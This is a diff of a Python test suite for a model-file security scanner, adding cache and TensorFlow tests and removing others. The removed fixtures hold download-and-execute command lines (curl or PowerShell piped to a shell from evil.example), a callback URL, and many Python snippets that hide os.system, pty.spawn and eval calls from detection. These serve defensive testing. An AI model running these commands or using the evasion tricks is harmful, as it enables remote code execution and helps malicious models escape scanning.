@@ -1,6 +1,8 @@
 import bz2
 import gzip
+import importlib
 import io
+import json
 import lzma
 import os
 import stat
@@ -10,12 +12,18 @@ import zipfile
 import zlib
 from collections.abc import Callable
 from pathlib import Path
-from typing import Any, ClassVar
+from typing import Any, ClassVar, cast
 
 import pytest
 
 from modelaudit import core
+from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.cache.optimized_config import build_cache_version_context
+from modelaudit.config import ModelAuditConfig, reset_config, set_config
+from modelaudit.rules import Severity
+from modelaudit.scanner_selection import normalize_scanner_selection_config
 from modelaudit.scanners import _registry, archive_dispatch
+from modelaudit.scanners import zip_scanner as zip_scanner_module
 from modelaudit.scanners._archive_locations import rewrite_extracted_member_location
 from modelaudit.scanners.archive_dispatch import (
     NESTED_SCAN_CALLBACK_CONFIG_KEY,
@@ -23,9 +31,16 @@ from modelaudit.scanners.archive_dispatch import (
     scan_nested_file,
 )
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, BaseScanner, CheckStatus, IssueSeverity, ScanResult
-from modelaudit.scanners.zip_scanner import ZipScanner
-from modelaudit.utils.file.detection import PROTOBUF_MODEL_CANDIDATE_FORMAT
-from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field
+from modelaudit.scanners.jax_checkpoint_scanner import JaxCheckpointScanner
+from modelaudit.scanners.zip_scanner import KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY, ZipScanner
+from modelaudit.utils.file import detection as file_detection
+from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
+from tests.helpers import (
+    create_mock_mxnet_symbol,
+    create_mock_onnx,
+    prefix_mock_onnx_with_unknown_field,
+    prefix_mock_onnx_with_unknown_group,
+)
 
 
 def _npy_payload() -> bytes:
@@ -36,31 +51,130 @@ def _npy_payload() -> bytes:
     return payload.getvalue()
 
 
-def _malicious_cntkv2_payload() -> bytes:
-    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
-    return (
-        prefix
-        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
-        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
-        + (b"A" * 96)
-        + b") exec(payload) "
-    )
+def _assert_inconclusive_zip_aggregate_not_cached(
+    path: Path,
+    expected_reason: str,
+    cache_dir: Path,
+    *,
+    expected_exit_code: int = 2,
+    expected_security_findings: bool = False,
+    **scan_kwargs: Any,
+) -> None:
+    reset_cache_manager()
+    try:
+        first = core.scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            **scan_kwargs,
+        )
+        second = core.scan_model_directory_or_file(
+            str(path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            **scan_kwargs,
+        )
+
+        for aggregate in (first, second):
+            metadata = aggregate.file_metadata[str(path)]
+            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert expected_reason in metadata["scan_outcome_reasons"]
+            security_findings = [
+                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+            ]
+            assert bool(security_findings) is expected_security_findings
+            assert core.determine_exit_code(aggregate) == expected_exit_code
+
+        top_level_config = normalize_scanner_selection_config(
+            {
+                "blacklist_patterns": None,
+                "max_file_size": 0,
+                "max_total_size": 0,
+                "timeout": 3600,
+                "skip_file_types": True,
+                "strict_license": False,
+                "cache_enabled": True,
+                "cache_dir": str(cache_dir),
+                "min_cache_file_size": 0,
+                **scan_kwargs,
+            }
+        )
+        cached_parent = get_cache_manager(str(cache_dir), enabled=True).get_cached_result(
+            str(path),
+            version_context=build_cache_version_context(top_level_config),
+        )
+        assert cached_parent is None
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
-def _malicious_lightgbm_payload() -> bytes:
-    return (
-        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
-        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
-        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
-    )
+def _assert_inconclusive_zip_scan_not_cached(
+    path: Path,
+    expected_reason: str,
+    cache_dir: Path,
+    **scan_kwargs: Any,
+) -> None:
+    scan_config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+        **scan_kwargs,
+    }
+    reset_cache_manager()
+    try:
+        first = ZipScanner(config=scan_config).scan_with_cache(str(path))
+        second = ZipScanner(config=scan_config).scan_with_cache(str(path))
+
+        for result in (first, second):
+            assert result.success is False
+            assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert expected_reason in result.metadata["scan_outcome_reasons"]
+            assert not [
+                issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+            ]
+
+        cached_parent = get_cache_manager(str(cache_dir), enabled=True).get_cached_result(
+            str(path),
+            version_context=build_cache_version_context(scan_config),
+        )
+        assert cached_parent is None
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
-def _malicious_rknn_payload() -> bytes:
-    return (
-        b"RKNN\x01\x00\x00\x00"
-        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
-        b"callback=http://198.51.100.5:8080/collect\n"
-    )
+def _build_malicious_tf_metagraph() -> bytes:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "zip_metagraph"
+    function = metagraph.graph_def.library.function.add()
+    function.signature.name = "danger"
+    node = function.node_def.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_malicious_tf_savedmodel() -> bytes:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    metagraph.meta_info_def.meta_graph_version = "owner"
+    node = metagraph.graph_def.node.add()
+    node.op = "PyFunc"
+    return cast(bytes, saved_model.SerializeToString())
 
 
 def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
@@ -159,361 +273,6 @@ def test_scan_zip_flags_aliased_dangerous_python_member(tmp_path: Path) -> None:
     assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
 
 
-@pytest.mark.parametrize(
-    "dangerous_name",
-    [
-        "os.execl",
-        "os.execle",
-        "os.execlp",
-        "os.execlpe",
-        "os.execv",
-        "os.execve",
-        "os.execvp",
-        "os.execvpe",
-        "os.posix_spawn",
-        "os.posix_spawnp",
-        "os.spawnl",
-        "os.spawnle",
-        "os.spawnlp",
-        "os.spawnlpe",
-        "os.spawnv",
-        "os.spawnve",
-        "os.spawnvp",
-        "os.spawnvpe",
-        "os.startfile",
-    ],
-)
-def test_scan_zip_flags_os_process_launch_python_member(tmp_path: Path, dangerous_name: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", f"import os\n{dangerous_name}('payload')\n")
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S101"
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
-
-
-def test_scan_zip_flags_aliased_os_process_launch_python_member(tmp_path: Path) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", "from os import spawnv as run\nrun(0, '/bin/sh', ['sh', '-c', 'id'])\n")
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S101"
-    assert python_checks[0].details["reason"] == "high-risk calls: os.spawnv"
-
-
-@pytest.mark.parametrize(
-    ("source", "dangerous_name"),
-    [
-        (
-            "import asyncio\nasyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n",
-            "asyncio.create_subprocess_exec",
-        ),
-        (
-            "from asyncio import create_subprocess_shell as run\nrun('id')\n",
-            "asyncio.create_subprocess_shell",
-        ),
-    ],
-)
-def test_scan_zip_flags_asyncio_process_launch_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S103"
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
-
-
-def test_scan_zip_preserves_possible_asyncio_launch_after_conditional_overwrite(tmp_path: Path) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    source = (
-        "import asyncio\nif replace:\n    asyncio.create_subprocess_shell = len\n"
-        "asyncio.create_subprocess_shell('id')\n"
-    )
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S103"
-    assert python_checks[0].details["reason"] == "high-risk calls: asyncio.create_subprocess_shell"
-
-
-@pytest.mark.parametrize(
-    ("source", "dangerous_name"),
-    [
-        ("import pty\npty.spawn('/bin/sh')\n", "pty.spawn"),
-        ("from pty import spawn as run\nrun('/bin/sh')\n", "pty.spawn"),
-    ],
-)
-def test_scan_zip_flags_pty_process_launch_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S111"
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
-
-
-def test_scan_zip_preserves_possible_pty_launch_after_conditional_overwrite(tmp_path: Path) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    source = "import pty\nif replace:\n    pty.spawn = len\npty.spawn('/bin/sh')\n"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S111"
-    assert python_checks[0].details["reason"] == "high-risk calls: pty.spawn"
-
-
-@pytest.mark.parametrize(
-    ("source", "dangerous_name"),
-    [
-        ("import runpy\nrunpy.run_module('payload')\n", "runpy.run_module"),
-        ("from runpy import run_path as run\nrun('payload.py')\n", "runpy.run_path"),
-    ],
-)
-def test_scan_zip_flags_runpy_execution_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S108"
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
-
-
-def test_scan_zip_preserves_possible_runpy_execution_after_conditional_overwrite(tmp_path: Path) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    source = "import runpy\nif replace:\n    runpy.run_path = len\nrunpy.run_path('payload.py')\n"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S108"
-    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"
-
-
-@pytest.mark.parametrize(
-    "source",
-    [
-        "import os\nos.system.__call__('echo hidden')\n",
-        "import os\nrun = os.system\nrun.__call__('echo hidden')\n",
-        "import os\ngetattr(os.system, '__call__')('echo hidden')\n",
-        "import os\ninvoke = os.system.__call__\nos.system = len\ninvoke('echo hidden')\n",
-        "import os\nrun = os.system\nos.system = len\nrun('echo hidden')\n",
-        "import os\nfrom os import system as run\nos.system = len\nrun('echo hidden')\n",
-        "import os\nfrom os import *\nos.system = len\nsystem('echo hidden')\n",
-        ("import os\ndef run(action=os.system):\n    os.system = len\n    action('echo hidden')\n"),
-        "import os\nrun = os.system\nsetattr(os, 'system', len)\nrun('echo hidden')\n",
-        "import os\nrun = os.system\nos.__dict__.update({'system': len})\nrun('echo hidden')\n",
-        (
-            "import os\n"
-            "replace = os.__dict__.update\n"
-            "replace = lambda values: None\n"
-            "replace({'system': len})\n"
-            "os.system('echo hidden')\n"
-        ),
-        "import os\nif replace:\n    os.__dict__.update({'system': len})\nos.system('echo hidden')\n",
-        "import os\nif swap:\n    os = make_module()\nos.__dict__.update({'system': len})\nos.system('echo hidden')\n",
-        "import os\nif swap:\n    os = make_module()\nsetattr(os, 'system', len)\nos.system('echo hidden')\n",
-        "import os\nif swap:\n    os = make_module()\nos.system = len\nos.system('echo hidden')\n",
-        (
-            "import os\nif swap:\n    os = make_module()\ntarget = os\n"
-            "target.__dict__.update({'system': len})\nos.system('echo hidden')\n"
-        ),
-        (
-            "import os\nif swap:\n    os = make_module()\ntarget = os\n"
-            "setattr(target, 'system', len)\nos.system('echo hidden')\n"
-        ),
-        ("import os\nif swap:\n    os = make_module()\ntarget = os\ntarget.system = len\nos.system('echo hidden')\n"),
-        (
-            "import os\ndef hide(target=os):\n"
-            "    target.__dict__.update({'system': len})\n"
-            "    os.system('echo hidden')\n"
-        ),
-        (
-            "import os\nresolve = getattr\nif swap:\n    resolve = make_resolver()\n"
-            "resolve(os, '__dict__').update({'system': len})\nos.system('echo hidden')\n"
-        ),
-        (
-            "import os\nnamespace = os.__dict__\nif swap:\n    namespace = make_mapping()\n"
-            "namespace.update({'system': len})\nos.system('echo hidden')\n"
-        ),
-        (
-            "import os\ndef hide(namespace=os.__dict__):\n"
-            "    namespace.update({'system': len})\n"
-            "    os.system('echo hidden')\n"
-        ),
-        (
-            "import os\nreplace = dict.update\nif swap:\n    replace = lambda target, values: None\n"
-            "replace(os.__dict__, {'system': len})\nos.system('echo hidden')\n"
-        ),
-        (
-            "import os\ndef hide(namespace=os.__dict__):\n"
-            "    dict.update(namespace, {'system': len})\n"
-            "    os.system('echo hidden')\n"
-        ),
-        "import os\nrun = os.__dict__.pop('system')\nrun('echo hidden')\n",
-        "import os\nif remove:\n    os.__dict__.pop('system')\nos.system('echo hidden')\n",
-        "import os\nif remove:\n    del os.__dict__['system']\nos.system('echo hidden')\n",
-        "import os\nif remove:\n    os.__dict__.__delitem__('system')\nos.system('echo hidden')\n",
-        (
-            "import os\nimport operator\nif remove:\n"
-            "    operator.delitem(os.__dict__, 'system')\nos.system('echo hidden')\n"
-        ),
-        "import os\nrun = os.system\nos.__dict__.clear()\nrun('echo hidden')\n",
-        "import os\nif remove:\n    os.__dict__.clear()\nos.system('echo hidden')\n",
-        "import os\nif swap:\n    os = make_module()\nos.__dict__.clear()\nos.system('echo hidden')\n",
-        ("import os\ndef hide(target=os):\n    setattr(target, 'system', len)\n    os.system('echo hidden')\n"),
-        ("import os\ndef hide(target=os):\n    target.system = len\n    os.system('echo hidden')\n"),
-        (
-            "import os\n"
-            "setattr = lambda target, key, value: None\n"
-            "setattr(os, 'system', len)\n"
-            "os.system('echo hidden')\n"
-        ),
-    ],
-)
-def test_scan_zip_preserves_captured_dangerous_callable_before_overwrite(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].details["reason"] == "high-risk calls: os.system"
-
-
-@pytest.mark.parametrize(
-    "source",
-    [
-        "import os\nos.system = len\nos.system.__call__([])\n",
-        "import os\nos.system = len\ngetattr(os.system, '__call__')([])\n",
-        "import os\nos.system = len\ninvoke = os.system.__call__\ninvoke([])\n",
-        "import os\nos.system = len\nrun = os.system\nrun([])\n",
-        "import os\nos.system = len\nfrom os import system as run\nrun([])\n",
-        "import os\nos.system = len\nfrom os import *\nsystem([])\n",
-        ("import os\nos.system = len\ndef run(action=os.system):\n    action([])\n"),
-        "import os\nsetattr(os, 'system', len)\nos.system([])\n",
-        "import os\nreplace = setattr\nreplace(os, 'system', len)\nos.system([])\n",
-        "import os\nresult = setattr(os, 'system', len)\nos.system([])\n",
-        "import os\nresult: None = setattr(os, 'system', len)\nos.system([])\n",
-        "import os\nsetattr(os, 'system', len)\nrun = os.system\nrun([])\n",
-        "import os\nos.__dict__.__setitem__('system', len)\nos.system([])\n",
-        "import os\nos.__dict__.update({'system': len})\nos.system([])\n",
-        "import os\nvars(os).update({'system': len})\nos.system([])\n",
-        "import os\nreplace = os.__dict__.update\nreplace({'system': len})\nos.system([])\n",
-        "import os\nresult = os.__dict__.update({'system': len})\nos.system([])\n",
-        "import os\nos.__dict__.update({'system': len})\nrun = os.system\nrun([])\n",
-        "import os\ngetattr(os, '__dict__').update({'system': len})\nos.system([])\n",
-        "import os\nos.__getattribute__('__dict__').update({'system': len})\nos.system([])\n",
-        "import os\nobject.__getattribute__(os, '__dict__').update({'system': len})\nos.system([])\n",
-        "import os\nnamespace = os.__dict__\nnamespace.update({'system': len})\nos.system([])\n",
-        "import os\nnamespace = getattr(os, '__dict__')\nnamespace.update({'system': len})\nos.system([])\n",
-        "import os\nreplace = getattr(os, '__dict__').update\nreplace({'system': len})\nos.system([])\n",
-        "import os\ndict.update(os.__dict__, {'system': len})\nos.system([])\n",
-        "import os\ndict.__setitem__(os.__dict__, 'system', len)\nos.system([])\n",
-        "import os\nimport operator\noperator.setitem(os.__dict__, 'system', len)\nos.system([])\n",
-        "import os\nfrom operator import setitem as replace\nreplace(os.__dict__, 'system', len)\nos.system([])\n",
-        "import os\nos.__dict__.pop('system')\nos.system([])\n",
-        "import os\nremove = os.__dict__.pop\nremove('system')\nos.system([])\n",
-        "import os\ndict.pop(os.__dict__, 'system')\nos.system([])\n",
-        "import os\ndel os.__dict__['system']\nos.system([])\n",
-        "import os\ndel os.system\nos.system([])\n",
-        "import os\nos.__dict__.__delitem__('system')\nos.system([])\n",
-        "import os\nremove = os.__dict__.__delitem__\nremove('system')\nos.system([])\n",
-        "import os\ndict.__delitem__(os.__dict__, 'system')\nos.system([])\n",
-        "import os\nimport operator\noperator.delitem(os.__dict__, 'system')\nos.system([])\n",
-        "import os\nos.__dict__.clear()\nos.system([])\n",
-        "import os\nvars(os).clear()\nos.system([])\n",
-        "import os\nclear = os.__dict__.clear\nclear()\nos.system([])\n",
-        "import os\ndict.clear(os.__dict__)\nos.system([])\n",
-        "import subprocess\nsubprocess.__dict__.update({'run': len})\nsubprocess.run([])\n",
-        "import subprocess\nsubprocess.__dict__.pop('run')\nsubprocess.run([])\n",
-        "import subprocess\nsubprocess.__dict__.clear()\nsubprocess.run([])\n",
-        "import os\nos.execvpe = len\nos.execvpe([])\n",
-        "import os\nos.__dict__.update({'spawnv': len})\nos.spawnv([])\n",
-        "import os\nsetattr(os, 'posix_spawn', len)\nos.posix_spawn([])\n",
-        "import asyncio\nasyncio.create_subprocess_shell = len\nasyncio.create_subprocess_shell([])\n",
-        "import pty\npty.spawn = len\npty.spawn([])\n",
-        "import runpy\nrunpy.run_path = len\nrunpy.run_path([])\n",
-    ],
-)
-def test_scan_zip_allows_callable_captured_after_safe_overwrite(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
-
-
 def test_scan_zip_flags_from_import_dangerous_python_member(tmp_path: Path) -> None:
     archive_path = tmp_path / "model_bundle.zip"
     with zipfile.ZipFile(archive_path, "w") as archive:
@@ -531,98 +290,28 @@ def test_scan_zip_flags_from_import_dangerous_python_member(tmp_path: Path) -> N
     assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
 
 
-@pytest.mark.parametrize(
-    "source",
-    [
-        "import os\nimport subprocess\nsetattr(os, 'system', subprocess.run)\nos.system(['id'])\n",
-        "import os\nimport subprocess\nresult = setattr(os, 'system', subprocess.run)\nos.system(['id'])\n",
-        "import os\nimport subprocess\nos.__dict__.update({'system': subprocess.run})\nos.system(['id'])\n",
-        "import os\nimport subprocess\nos.__dict__.__setitem__('system', subprocess.run)\nos.system(['id'])\n",
-        "import os\nimport subprocess\ngetattr(os, '__dict__').update({'system': subprocess.run})\nos.system(['id'])\n",
-        (
-            "import os\nimport subprocess\nnamespace = os.__dict__\n"
-            "namespace.update({'system': subprocess.run})\nos.system(['id'])\n"
-        ),
-        "import os\nimport subprocess\ndict.update(os.__dict__, {'system': subprocess.run})\nos.system(['id'])\n",
-        (
-            "import os\nimport operator\nimport subprocess\n"
-            "operator.setitem(os.__dict__, 'system', subprocess.run)\nos.system(['id'])\n"
-        ),
-        (
-            "import os\nimport subprocess\nos.__dict__.clear()\n"
-            "os.__dict__.update({'system': subprocess.run})\nos.system(['id'])\n"
-        ),
-        "import os\nimport subprocess\nos.execvpe = subprocess.run\nos.execvpe(['id'])\n",
-        (
-            "import asyncio\nimport subprocess\nasyncio.create_subprocess_exec = subprocess.run\n"
-            "asyncio.create_subprocess_exec(['id'])\n"
-        ),
-        "import pty\nimport subprocess\npty.spawn = subprocess.run\npty.spawn(['id'])\n",
-    ],
-)
-def test_scan_zip_reports_dangerous_setattr_replacement(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
-
-
-@pytest.mark.parametrize(
-    ("source", "dangerous_name"),
-    [
-        (
-            "import os\nimport subprocess\nsubprocess.__dict__.update({'run': os.system})\nsubprocess.run('id')\n",
-            "os.system",
-        ),
-        (
-            "import subprocess\nrun = subprocess.Popen\nsubprocess.__dict__.clear()\n"
-            "subprocess.__dict__.update({'run': run})\nsubprocess.run([])\n",
-            "subprocess.Popen",
-        ),
-        (
-            "import os\nimport subprocess\nsubprocess.__dict__.update({'list2cmdline': os.system})\n"
-            "subprocess.list2cmdline(['id'])\n",
-            "os.system",
-        ),
-        (
-            "import os\nimport subprocess\nsubprocess.__dict__.update({'CompletedProcess': os.system})\n"
-            "subprocess.CompletedProcess('id')\n",
-            "os.system",
-        ),
-        ("import subprocess\nsubprocess.__dict__.pop('run')(['id'])\n", "subprocess.run"),
-    ],
-)
-def test_scan_zip_reports_dangerous_subprocess_mapping_replacement(
-    tmp_path: Path, source: str, dangerous_name: str
-) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
-
-
 def test_scan_zip_flags_wildcard_import_dangerous_python_member(tmp_path: Path) -> None:
     archive_path = tmp_path / "model_bundle.zip"
     with zipfile.ZipFile(archive_path, "w") as archive:
         archive.writestr("handler.py", "from subprocess import *\nrun(['echo', 'hidden'], check=False)\n")
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].severity == IssueSeverity.WARNING
+    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
+
+
+def test_scan_zip_preserves_subprocess_after_asyncio_wildcard_import(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import subprocess\nfrom asyncio import *\nsubprocess.run(['echo', 'hidden'], check=False)\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
 
     result = ZipScanner().scan(str(archive_path))
 
@@ -653,164 +342,6 @@ def test_scan_zip_flags_builtins_getattr_keyword_call_dangerous_python_member(tm
     assert python_checks[0].severity == IssueSeverity.WARNING
     assert python_checks[0].rule_code == "S101"
     assert python_checks[0].details["reason"] == "high-risk calls: os.system"
-
-
-@pytest.mark.parametrize(
-    "source",
-    [
-        "__builtins__['ev' + 'al']('1 + 1')\n",
-        "getattr(__builtins__, 'eval')('1 + 1')\n",
-        "__builtins__.__dict__.get('eval')('1 + 1')\n",
-        "globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
-        "globals().get('__builtins__').get('eval')('1 + 1')\n",
-        "getattr(globals()['__builtins__'], 'eval')('1 + 1')\n",
-        "namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
-        "namespace = globals()\nnamespace.get('__builtins__').get('eval')('1 + 1')\n",
-        "namespace = globals()\ngetattr(namespace['__builtins__'], 'eval')('1 + 1')\n",
-        "lookup = globals().get\nlookup('__builtins__').get('ev' + 'al')('1 + 1')\n",
-        "namespace = globals()\nlookup = namespace.get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
-        "lookup = globals()['__builtins__'].get\nlookup('ev' + 'al')('1 + 1')\n",
-        "lookup = globals()['__builtins__'].__getitem__\nlookup('ev' + 'al')('1 + 1')\n",
-        ("run = globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval'] = len\nrun.__call__('1 + 1')\n"),
-        "run = globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval'] = len\nrun('1 + 1')\n",
-        ("run = globals()['__builtins__']['eval']\nglobals()['__builtins__'].__setitem__('eval', len)\nrun('1 + 1')\n"),
-        (
-            "run = globals()['__builtins__']['eval']\n"
-            "replace = globals()['__builtins__'].__setitem__\n"
-            "replace('eval', len)\n"
-            "run('1 + 1')\n"
-        ),
-        (
-            "run = globals()['__builtins__']['eval']\n"
-            "globals()['__builtins__']['eval'] = __builtins__['exec']\n"
-            "run('1 + 1')\n"
-        ),
-        "globals()['__builtins__'].pop('eval')('1 + 1')\n",
-        "run = globals()['__builtins__'].pop('eval')\nrun('1 + 1')\n",
-        "if remove:\n    del globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval']('1 + 1')\n",
-        "run = globals()['__builtins__']['eval']\nglobals()['__builtins__'].clear()\nrun('1 + 1')\n",
-        "if remove:\n    globals()['__builtins__'].clear()\nglobals()['__builtins__']['eval']('1 + 1')\n",
-    ],
-)
-def test_scan_zip_flags_implicit_builtins_dangerous_python_member(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S104"
-    assert python_checks[0].details["reason"] == "high-risk calls: __builtins__.eval"
-
-
-@pytest.mark.parametrize(
-    "source",
-    [
-        "callbacks = {'eval': len}\ncallbacks['eval']([])\n",
-        "import builtins as bi\nbi.open('labels.json', 'r')\n",
-        "globals()['__builtins__']['len']([1])\n",
-        "globals = lambda: {'__builtins__': {'eval': len}}\nglobals()['__builtins__']['eval']([])\n",
-        "namespace = globals()\nnamespace['__builtins__']['len']([1])\n",
-        ("namespace = globals()\nnamespace = {'__builtins__': {'eval': len}}\nnamespace['__builtins__']['eval']([])\n"),
